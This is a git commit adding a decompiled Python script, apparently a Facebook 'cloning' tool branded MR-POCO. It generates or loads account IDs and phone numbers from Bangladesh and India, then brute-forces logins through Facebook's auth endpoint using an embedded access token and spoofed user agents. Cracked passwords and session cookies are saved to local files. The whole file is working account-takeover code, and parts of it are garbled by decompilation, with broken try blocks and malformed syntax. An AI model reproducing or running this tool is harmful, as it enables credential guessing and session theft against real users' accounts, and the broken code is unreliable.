9965cf72a47b60d973a5546af72764d35c3d95da
GOJO saturo <162873951+Gojosaturo100pro@users.noreply.github.com>
2025-01-12 03:33:24 +0600

    Add files via upload

---
+++ tecno.py
@@ -0,0 +1,329 @@
+#--DECODED BY VAMPIRE
+
+
+global oks  # inserted
+global cps  # inserted
+global loop  # inserted
+import os
+import requests
+import json
+import time
+import re
+import random
+import sys
+import uuid
+import string
+import subprocess
+import datetime
+try:
+    import os
+    import requests
+    import json
+    import time
+    import re
+    import random
+    import sys
+    import uuid
+    import string
+    import subprocess
+    from string import *
+    import bs4
+    from concurrent.futures import ThreadPoolExecutor as tred
+    from bs4 import BeautifulSoup as sop
+    from bs4 import BeautifulSoup
+except ModuleNotFoundError:
+    pass  # postinserted
+else:  # inserted
+    loop = 0
+    oks = []
+    cps = []
+    pcp = []
+    id = []
+    tokenku = []
+    plist = []
+    user = []
+    sys.stdout.write(']2; ❯-MR-POCO \a')
+    G = '[38;5;46m'
+    W = '[38;5;15m'
+    R = '[38;5;160m'
+    B = '[1;90m'
+    Y = '[1;33m'
+    T = '[1;34m'
+    E = '[38;5;205m'
+    xd = f'{R}/{W}❯{R}/{G}'
+    xd1 = f'{R}/{W}1{R}/{G}'
+    xd2 = f'{R}/{W}2{R}/{G}'
+    xd3 = f'{R}/{W}3{R}/{G}'
+    xd4 = f'{R}/{W}4{R}/{G}'
+    xd5 = f'{R}/{W}5{R}/{G}'
+    xd6 = f'{R}/{W}6{R}/{G}'
+    xd0 = f'{R}/{W}0{R}/{G}'
+    xdx = f'{R}/{W}?{R}/{G}'
+    xdxx = f'{W}━{R}➤{G}'
+    dic = {'1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL', '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST', '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'}
+    sex1 = datetime.datetime.now().day
+    sex2 = dic[str(datetime.datetime.now().month)]
+    date = f'{G}' + str(sex1) + f'{W}-{G}' + str(sex2)
+
+    def ___swag___():
+        return random.choice(*('SM-T835', 'SM-S901U', 'SM-S134DL', SM-J250F, 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'CPH2083', 'CPH2235', 'CPH2499', 'CPH2185', 'CPH2499', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'CPH2083', 'CPH2235', 'CPH2499', 'CPH2185', 'CPH2065', 'CPH2499', 'CPH2185', 'CPH2065', 'CPH2499', 'CPH2185', 'CPH2185', 'CPH2185', 'CPH2185', 'CPH2185', 'CPH2499', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'CPH2083', 'CPH2235', 'CPH2499', 'CPH2185', 'CPH2185', '
+        fban = random.choice(['FB4A'])
+        facebook_version = f'{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'
+        fb_ver_code = str(random.randint(10000000, 66666666))
+        density = random.choice(['1.0', '1.7', '2.0', '2.25', '2.5', '3.0', '3.5'])
+        width = random.randint(720, 1440)
+        height = random.randint(1080, 2560)
+        fblc = random.choice(['en_US', 'en_GB'])
+        sim_name = random.choice(['Banglalink', 'Robi', 'MTN-CG', 'Grameenphone', 'Artel', 'Teletalk'])
+        fbpn = random.choice(['com.facebook.katana'])
+        fbmf = 'Realme'
+        fbbd = 'Realme'
+        mobile_model = f'{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
+        modelx = random.choice(['RMX1945', 'RMX1911', 'RMX2193', 'RMX1945', 'RMX1931', 'RMX2170', 'RMX3201', 'RMX2180', 'RMX2021', 'RMX2020', 'RMX2155', 'RMX1921', 'RMX2156', 'RMX3363', 'RMX3081', 'RMX2001', 'RMX3263', 'RMX2155', 'RMX2001', 'RMX3195', 'RMX1945', 'RMX1993'])
+        last = f'[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{density={density},width={width},height={height}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {mix} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + last
+        return ua
+
+    def clear():
+        os.system('clear')
+        print(logo)
+
+    def linex():
+        print(f'{W}───────────────────────────────────────────────')
+    logo = ''.join(f'\n           {G}┏┳┓┏━┓   ┏━┓┏━┓┏━╸┏━┓\n           {G}┃┃┃┣┳┛╺━╸┣━┛┃ ┃┃  ┃ ┃\n           {G}╹ ╹╹┗╸   ╹  ┗━┛┗━╸┗━┛ {W}1.0\n{W}───────────────────────────────────────────────\n{xd}00, 0, ' DEVELOPER ', xdxx, ' MR-POCO\n', xd, 0, ' TOOLTYPE  ', xdxx, ' FILE', R, 0, '/', G, '/', G, 'CLONING\n', xd, 0, ' STATUS    ', xdxx, ' PREMIUM\n', W, '───────────────────────────────────────────────')
+
+    def poco():
+        clear()
+        print(f'{xd1} FILE CLONING ')
+        print(f'{xd2} RANDOM CLONING ')
+        print(f'{xd0} EXIT CLONING ')
+        linex()
+        chude = input(f'{xdx} SELECT {xdxx} ')
+        if chude in ['1']:
+            __filex__()
+        else:  # inserted
+            if chude in ['2']:
+                __randomx__()
+            else:  # inserted
+                if chude in ['0']:
+                    exit()
+                else:  # inserted
+                    linex()
+                    print(f'{xd} OPTION NOT FOUND ')
+                    linex()
+                    time.sleep(1)
+                    print(f'{xd} TRY AGAIN ')
+                    time.sleep(1)
+                    poco()
+
+    def __filex__():
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} /sdcard/mrpoco.txt ')
+        linex()
+        file = input(f'{xdx} ENTER FILE NAME {xdxx} ')
+        try:
+            fo = open(file, 'r').read().splitlines()
+        except FileNotFoundError:
+            pass  # postinserted
+        else:  # inserted
+            try:
+                clear()
+                print(f'{xd} EXAMPLE {xdxx} 5-30')
+                linex()
+                ps_limit = int(input(f'{xd}0 PASSWORD LIMIT {xdxx}{W} '))
+        except:
+            pass  # postinserted
+        ps_limit = 5
+        else:  # inserted
+            pass  # postinserted
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} firstlast {R}/{G} first12 {R}/{G} first123 ')
+        linex()
+        for i in range(ps_limit):
+            plist.append(input(f'{xd} PASSWORD NO{W}{i + 1} {xdxx}{W} '))
+        with tred(max_workers=30) as ____pokpok____:
+            clear()
+            total_ids = str(len(fo))
+            print(f'{xd}0 TOTAL FILE UID{R}/{G}PASSWORD LIMIT {xdxx} {W}{total_ids}{R}/{W}{ps_limit}0')
+            print(f'{xd}0 USE APN OR {R}/{G}ON{R}/{G}OFF{R}/{G} AIRPLANE MODE')
+            linex()
+            for user in fo:
+                ids, names = user.split('|')
+                passlist = plist
+                ____pokpok____.submit(___PO_CO___, ids, names, passlist)
+        print('[1;37m')
+        print(f'{W}───────────────────────────────────────────────')
+        print(f'{xd} THE PROCESS HAS COMPLETED')
+        print(f'{xd} TOTAL OK{R}/{G}CP {xdxx}0 ' + str(len(oks)) + '|' + str(len(cps)))
+        print(f'{W}───────────────────────────────────────────────')
+        exit()
+        linex()
+        print(f'{xd} FILE NOT FOUND ')
+        linex()
+        time.sleep(1)
+        print(f'{xd} TRY AGAIN ')
+        time.sleep(1)
+        __filex__()
+
+    def __randomx__():
+        clear()
+        print(f'{xd1} RANDOM {R}/{W}BD{R}/{G} CLONING ')
+        print(f'{xd2} RANDOM {R}/{W}INDIA{R}/{G} CLONING ')
+        print(f'{xd0} EXIT CLONING ')
+        linex()
+        chudex = input(f'{xdx} SELECT {xdxx} ')
+        if chudex in ['1']:
+            __bd__()
+        else:  # inserted
+            if chudex in ['2']:
+                __India__()
+            else:  # inserted
+                if chudex in ['0']:
+                    exit()
+                else:  # inserted
+                    linex()
+                    print(f'{xd} OPTION NOT FOUND ')
+                    linex()
+                    time.sleep(1)
+                    print(f'{xd} TRY AGAIN ')
+                    time.sleep(1)
+                    poco()
+
+    def __bd__():
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} 016 {R}/{G} 017 {R}/{G} 018 {R}/{G} 019')
+        linex()
+        code = input(f'{xdx} SELECT  {xdxx} ')
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} 5555 {R}/{G} 7777 {R}/{G} 9999 {R}/{G} 99999')
+        linex()
+        limit = int(input(f'{xdx} SELECT  {xdxx} '))
+        for nmbr in range(limit):
+            nmp = ''.join((random.choice(string.digits) for _ in range(8)))
+            user.append(nmp)
+        with tred(max_workers=30) as ____poco____:
+            clear()
+            tl = str(len(user))
+            print(f'{xd}0 CODE{R}/{G}UID {xdxx} {W}{code}{R}/{W}{tl}0')
+            print(f'{xd}0 USE APN OR {R}/{G}ON{R}/{G}OFF{R}/{G} AIRPLANE MODE')
+            linex()
+            for love in user:
+                ids = code + love
+                passlist = [ids, love, ids[:7], ids[:6], ids[:8]]
+                ____poco____.submit(____P_O_C_O_____, ids, passlist)
+        print('[1;37m')
+        print(f'{W}───────────────────────────────────────────────')
+        print(f'{xd} THE PROCESS HAS COMPLETED')
+        print(f'{xd} TOTAL OK{R}/{G}CP {xdxx}0 ' + str(len(oks)) + '|' + str(len(cps)))
+        print(f'{W}───────────────────────────────────────────────')
+        exit()
+
+    def __India__():
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} +91639 {R}/{G} +91629 {R}/{G} +91634 ')
+        linex()
+        code = input(f'{xdx} SELECT  {xdxx} ')
+        clear()
+        print(f'{xd} EXAMPLE {xdxx} 5555 {R}/{G} 7777 {R}/{G} 9999 {R}/{G} 99999')
+        linex()
+        limit = int(input(f'{xdx} SELECT  {xdxx} '))
+        for nmbr in range(limit):
+            nmp = ''.join((random.choice(string.digits) for _ in range(7)))
+            user.append(nmp)
+        with tred(max_workers=30) as ____poco____:
+            clear()
+            tl = str(len(user))
+            print(f'{xd}0 CODE{R}/{G}UID {xdxx} {W}{code}{R}/{W}{tl}0')
+            print(f'{xd}0 USE APN OR {R}/{G}ON{R}/{G}OFF{R}/{G} AIRPLANE MODE')
+            linex()
+            for love in user:
+                ids = code + love
+                passlist = [ids, love, '57273200', '59039200', '57575751', '57575752', '07860786']
+                ____poco____.submit(____P_O_C_O_____, ids, passlist)
+        print('[1;37m')
+        print(f'{W}───────────────────────────────────────────────')
+        print(f'{xd} THE PROCESS HAS COMPLETED')
+        print(f'{xd} TOTAL OK{R}/{G}CP {xdxx}0 ' + str(len(oks)) + '|' + str(len(cps)))
+        print(f'{W}───────────────────────────────────────────────')
+        exit()
+
+    def ___PO_CO___(ids, names, passlist):
+        global loop  # inserted
+        try:
+            sys.stdout.write('\r' % f'{R}/{W}❯{R}/{W}-{R}0{R}/{G}0{date}0{R}/{W}-{R}0{W}-{R}0{W}-{R}0{W}-{R}0{W}-{R}0{Y}0{R}0{'/ ') % (loop, len(oks), len(cps)))
+            sys.stdout.flush()
+            fn = names.split(' ')[0]
+        except Exception as e:
+            pass  # postinserted
+        else:  # inserted
+            try:
+                ln = names.split(' ')[1]
+            except:
+                ln = fn
+            else:  # inserted
+                for pw in passlist:
+                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
+                    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                    random_seed = random.Random()
+                    ____uax____ = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+                    data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}}
+                    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': ___swag___(), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'Accept-Encoding': 'gzip, deflate', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Connection': 'Keep-Alive'}
+                    url = 'https://graph.facebook.com/auth/login'
+                    po = requests.post(url, data=data, headers=headers).json()
+                    if 'session_key' in po:
+                        cookies = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
+                        print(f'\r{R}0/{W}❯{R}0/{W}-{R}0/{G}POCO-OK{R}0/{G} ' + ids + ' | ' + pas + '[1;97m')
+                        print(f'\r{R}0/{W}❯{R}0/{W}-{R}/💥{R}/{W} ' + cookies)
+                        open('/sdcard/MR-POCO-FILE-OK.txt', 'a').write(ids + '|' + pas + '|' + cookies + '\n')
+                        oks.append(ids)
+                        break
+                    if 'www.facebook.com' in po['error']['message']:
+                        print(f'\r{R}0/{W}❯{R}0/{W}-{R}0/{Y}POCO-CP{R}0/{Y} ' + ids + ' | ' + pas + '[1;97m')
+                        open('/sdcard/MR-POCO-FILE-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                        cps.append(ids)
+                        break
+                    pass
+                    loop += 1
+                return None
+
+    def ____P_O_C_O_____(ids, passlist):
+        global loop  # inserted
+        sys.stdout.write('\r' % f'{R}/{W}❯{R}/{W}-{R}0{R}/{G}0{date}0{R}/{W}-{R}0{W}-{R}0{W}-{R}0{W}-{R}0{W}-{R}0{Y}0{R}0{'/ ') % (loop, len(oks), len(cps)))
+        sys.stdout.flush()
+        try:
+            for pas in passlist:
+                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                random_seed = random.Random()
+                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                device_id = str(uuid.uuid4())
+                ____ua____ = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/486.0.0.0.59;FBBV/456206141;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/Benco;FBBD/Benco;FBDV/AE9240;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=1.6,width=720,height=1640};FB_FW/1;]'
+                data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
+                headers = {'Authorization': f'OAuth {accessToken}0', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': ___swag___(), 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+                url = 'https://b-graph.facebook.com/auth/login'
+                po = requests.post(url, data=data, headers=headers).json()
+                if 'session_key' in po:
+                    uid = po['uid']
+                    cookies = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
+                    response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
+                    if 'Photoshop' in response:
+                        print(f'\r{R}/{W}❯{R}/{W}-{R}/{G}POCO-OK{R}/{G} {str(uid)} | {pas} ')
+                        print(f'\r{R}/{W}❯{R}/{W}-{R}/💥{R}/{W} {cookies} ')
+                        open('/sdcard/MR-POCO-RNDM-OK.txt', 'a').write(str(uid) + '|' + pas + '|' + cookies + '\n')
+                        oks.append(str(uid))
+                        break
+                    continue
+                if 'www.facebook.com' in po['error']['message']:
+                    uid = po['error']['error_data']['uid']
+                    print(f'\r{R}/{W}❯{R}/{W}-{R}/{Y}POCO-CP{R}/{Y} {str(uid)} | {pas} ')
+                    open('/sdcard/MR-POCO-RNDM-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
+                    cps.append(str(uid))
+                    break
+                pass
+            loop += 1
+        except Exception as e:
+            return None
+    poco()
+    print('/❯/ INSTALLING MISSING MODULES......')
+    os.system('pip install requests bs4 futures==2 > /dev/null')
+else:  # inserted
+    pass
